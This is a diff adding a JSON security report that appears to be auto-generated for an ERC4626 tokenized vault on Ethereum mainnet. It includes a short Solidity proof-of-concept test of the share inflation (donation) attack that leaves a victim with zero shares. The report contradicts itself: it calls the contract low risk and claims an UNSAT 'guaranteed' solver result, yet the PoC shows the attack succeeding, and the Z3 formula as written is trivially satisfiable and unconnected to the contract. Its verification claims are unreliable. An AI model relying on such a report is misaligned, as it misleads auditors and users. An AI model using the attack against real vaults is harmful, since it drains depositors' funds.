@@ -1,0 +1,16 @@
+{
+  "targetContract": "ERC4626 Tokenized Vault (Standard)",
+  "symbol": "ERC4626",
+  "address": "0x1111111254fb6c44bac0bed2854e76f90643097d",
+  "network": "Ethereum Mainnet",
+  "tier": "ADVANCED_FORMAL_VERIFICATION_SMT",
+  "riskScore": 28,
+  "riskLabel": "LOW RISK",
+  "proofOfConceptSolidity": "function testERC4626InflationAttack() public {\n  vault.deposit(1, attacker);\n  underlying.transfer(address(vault), 100000e18);\n  vm.prank(victim);\n  uint256 victimShares = vault.deposit(50000e18, victim);\n  assertEq(victimShares, 0);\n}",
+  "formalInvariantZ3": "(declare-const victimShares Int)\n(declare-const victimDeposit Int)\n(assert (and (> victimDeposit 1000000) (= victimShares 0)))\n(check-sat) ; Expected UNSAT",
+  "solverResult": "UNSAT (Property Guaranteed Across Execution Space)",
+  "compilerTarget": "solc 0.8.20",
+  "proxyPattern": "ERC1967 Transparent Upgradeable Proxy",
+  "merkleEvidenceSeal": "b43c25ea1dfc604c1e1d495362ab9648eb73f0280b17f97e404f3e23c6bfe62f",
+  "iteration": "ANA-2-REMEDIATED-HARDENED-CYCLE"
+}
